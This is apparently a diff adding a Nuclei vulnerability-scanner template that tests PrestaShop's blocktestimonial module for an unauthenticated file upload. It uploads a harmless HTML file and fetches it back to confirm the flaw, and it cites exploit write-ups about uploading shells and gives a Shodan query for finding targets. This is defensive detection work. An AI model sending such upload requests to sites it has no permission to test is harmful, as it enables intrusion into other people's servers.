@@ -1,0 +1,65 @@
+id: prestashop-blocktestimonial-modules-file-upload
+
+info:
+  name: Prestashop Blocktestimonial Modules File Upload
+  author: MaStErChO
+  severity: critical
+  reference:
+    - https://3xploit7.blogspot.com/2016/12/pretashop-blocktestimonial-upload-shell.html
+    - https://github.com/indoxploit-coders/blocktestimonial-file-upload
+    - https://exploit.linuxsec.org/prestashop-module-blocktestimonial-file-upload-auto-exploit
+  metadata:
+    framework: prestashop
+    shodan-query: http.component:"prestashop"
+  tags: intrusive,file-upload,php,prestashop
+variables:
+  filename: '{{rand_base(7, "abc")}}'
+http:
+  - raw:
+      - |
+        POST /modules/blocktestimonial/addtestimonial.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_submitter_name"
+
+        nuclei
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_title"
+
+        tested by nuclei
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_main_message"
+
+        tested by nuclei
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_img"; filename="{{filename}}.html"
+        Content-Type: text/html
+
+        <html>
+        <body>
+        <h1>Nuclei Check</h1>
+        </body>
+        </html>
+
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial"
+
+        Submit Testimonial
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl--
+        
+      - |
+        GET /upload/{{filename}}.html HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Your testimonial was submitted successfully."
+        part: body_1
+      - type: word
+        words:
+          - "<h1>Nuclei Check</h1>"
+        part: body_2
